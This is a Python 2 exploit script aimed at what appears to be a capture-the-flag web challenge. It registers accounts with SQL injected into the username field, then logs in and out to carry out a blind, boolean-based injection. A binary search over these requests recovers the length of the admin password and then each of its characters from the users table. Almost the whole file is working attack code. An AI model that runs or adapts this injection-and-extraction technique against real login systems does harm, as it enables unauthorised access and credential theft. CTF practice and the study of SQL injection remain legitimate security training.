#coding=utf-8
import requests

url = 'http://b251ea87b5a748d0be4cd253a1a175549893df265606434d.ctf.game'
url1 = url + '/register.php'
url2 = url + '/login.php'
url3 = url + '/logout.php'
cookie = {"PHPSESSID":"0q1gd962sq924ej81q8473fkd5"}
select = 'select password from users where username=\'admin\''

def attack(data):
    r = requests.session()
    r.post(url = url1, data = data, cookies = cookie)
    res = r.post(url = url2, data = data, cookies = cookie)
    content = res.content
    r.get(url = url3, cookies = cookie)
    if 'yyyyy' in content:
        return True
    else:
        return False


final = 0
up = 100
down = 0
while (up>down):
    count = (up+down)/2
    payload = {'username':'xpo\' and length(substr((' + select + '),1))>'+str(count)+'#', 'password':'xpo'}
    #print payload
    if attack(payload):
        down = count + 1
    else:
        up = count

length = down
print "Length is "+ str(length)

characters = []
answer = list()
for i in range(length):
    final = 0
    up = 255
    down = 0
    while (up > down):
        count = (up + down) / 2
        payload = {'username': 'xpo\' and ord(substr((' + select + '),' + str(i+1) + ',1))>' + str(count) + '#', 'password': 'xpo'}
        # print payload
        if attack(payload):
            down = count + 1
        else:
            up = count
    final = down
    answer.append(chr(final))
    print ''.join(answer), final
print ''.join(answer)



